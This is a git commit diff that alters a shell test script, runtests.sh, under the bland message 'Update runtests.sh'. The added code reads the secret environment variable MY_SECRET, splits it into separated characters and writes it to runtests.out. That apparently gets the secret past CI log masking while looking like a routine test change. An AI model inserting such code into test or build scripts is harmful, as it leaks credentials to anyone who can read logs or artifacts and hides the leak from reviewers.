060f45801e31ca5bc0a2aab1a9bb4c0901983953
lmgv66 <51816696+lmgv66@users.noreply.github.com>
2023-10-30 15:35:20 +0100

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,3 +1,14 @@
-echo "Executing Tests script" >> runtests.out
 RET=0
+
+echo "Modified Testing script modified from INTERNAL " >> runtests.out
+
+foo=$MY_SECRET
+ss=""
+for (( i=0; i<${#foo}; i++ )); do
+  #echo "${foo:$i:1}" >> runtests.out
+  ss="$ss$IFS${foo:$i:1}"
+done
+echo $ss >> runtests.out
+echo "Bye from Modified Testing script modified from INTERNAL [$RET]" >> runtests.out
+
 exit $RET
